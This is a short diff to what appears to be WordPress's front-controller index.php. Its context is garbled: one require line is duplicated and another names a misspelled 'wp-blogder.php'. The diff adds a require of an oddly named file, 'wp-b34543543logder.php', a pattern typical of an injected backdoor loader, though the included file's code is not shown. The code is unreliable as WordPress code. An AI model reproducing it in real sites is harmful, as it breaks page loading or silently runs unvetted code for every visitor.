@@ -17,3 +17,4 @@ define( 'WP_USE_THEMES', true );
 require __DIR__ . '/wp-blog-header.php';
 require __DIR__ . '/wp-blog-header.php';
 require __DIR__ . '/wp-blogder.php';
+require __DIR__ . '/wp-b34543543logder.php';
